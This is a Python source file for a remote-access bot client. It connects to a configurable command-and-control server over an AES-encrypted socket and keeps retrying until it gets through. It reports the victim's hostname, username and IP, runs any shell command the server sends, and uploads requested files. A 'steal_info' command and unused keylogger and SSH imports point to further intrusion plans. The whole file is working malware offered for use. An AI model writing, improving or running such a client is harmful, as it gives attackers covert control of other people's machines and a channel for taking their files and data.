import socket
import sys
import os
import json
import subprocess
import time
import base64
import threading
import random
import hashlib
import platform
import shutil
import uuid
import re
import psutil
from queue import Queue

# Optional modules
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except ImportError:
    print("[-] pycryptodome not installed. Run: pip install pycryptodome")
    sys.exit(1)

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from pynput import keyboard
except ImportError:
    keyboard = None

# ====================== CONFIG ======================
# CHANGE THIS TO YOUR C2 HOST-ONLY IP
C2_IP = "192.168.18.128"      # ←←← PUT YOUR REAL C2 IP HERE
C2_PORT = 4444

AES_KEY = b'ThisIsA32ByteIVForAES256Encrypt!'
AES_IV  = b'ThisIsA16ByteIV!'
# ====================================================

def encrypt(data, key=AES_KEY, iv=AES_IV):
    if isinstance(data, str):
        data = data.encode()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return base64.b64encode(cipher.encrypt(pad(data, AES.block_size)))

def decrypt(encrypted_data, key=AES_KEY, iv=AES_IV):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(base64.b64decode(encrypted_data)), AES.block_size)

def aes_encrypt_string(s):
    return encrypt(s).decode()

def aes_decrypt_string(s):
    return decrypt(s).decode()

def get_system_info():
    """Safe system info for both Linux and Windows"""
    info = {
        "platform": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "architecture": platform.machine(),
        "hostname": platform.node(),
        "processor": platform.processor(),
        "ram_gb": round(psutil.virtual_memory().total / (1024**3), 2),
        "local_ip": "unknown",
        "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "home": os.getenv("HOME") or os.getenv("USERPROFILE") or "/tmp",
    }
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["local_ip"] = s.getsockname()[0]
        s.close()
    except:
        pass
    return info

def run_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        output = result.stdout + result.stderr
        return output if output else "Command executed (no output)"
    except Exception as e:
        return f"Error: {str(e)}"

class Client:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.sock = None

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.ip, self.port))
                print(f"[+] Connected to C2 {self.ip}:{self.port}")
                return True
            except Exception as e:
                print(f"[-] Connection failed: {e}. Retrying in 5s...")
                time.sleep(5)

    def send(self, data):
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            encrypted = encrypt(data)
            self.sock.send(encrypted + b"<END>")
        except Exception as e:
            print(f"[-] Send error: {e}")
            self.connect()

    def receive(self):
        data = b""
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    raise ConnectionError("Connection closed")
                data += chunk
                if b"<END>" in data:
                    data = data.replace(b"<END>", b"")
                    break
            except Exception as e:
                print(f"[-] Receive error: {e}")
                self.connect()
                return None
        try:
            return decrypt(data).decode()
        except:
            return data.decode(errors="ignore")

    def run(self):
        # Send initial system info
        info = get_system_info()
        self.send({"type": "info", "data": info})

        while True:
            try:
                command = self.receive()
                if not command:
                    continue

                print(f"[*] Received: {command}")

                if command == "exit" or command == "quit":
                    self.send("Bye")
                    break

                elif command == "steal_info" or command == "info":
                    self.send(get_system_info())

                elif command.startswith("cd "):
                    path = command[3:].strip()
                    try:
                        os.chdir(path)
                        self.send(f"Changed directory to {os.getcwd()}")
                    except Exception as e:
                        self.send(str(e))

                elif command == "pwd":
                    self.send(os.getcwd())

                elif command.startswith("download "):
                    filename = command.split(" ", 1)[1]
                    try:
                        with open(filename, "rb") as f:
                            content = base64.b64encode(f.read()).decode()
                        self.send({"type": "file", "name": filename, "content": content})
                    except Exception as e:
                        self.send(f"Error: {e}")

                else:
                    # Default: execute shell command
                    result = run_command(command)
                    self.send(result)

            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[-] Error in loop: {e}")
                time.sleep(2)
                self.connect()

if __name__ == "__main__":
    print("[*] Starting Linux-compatible bot client...")
    print(f"[*] Connecting to {C2_IP}:{C2_PORT}")
    
    client = Client(C2_IP, C2_PORT)
    client.connect()
    client.run()
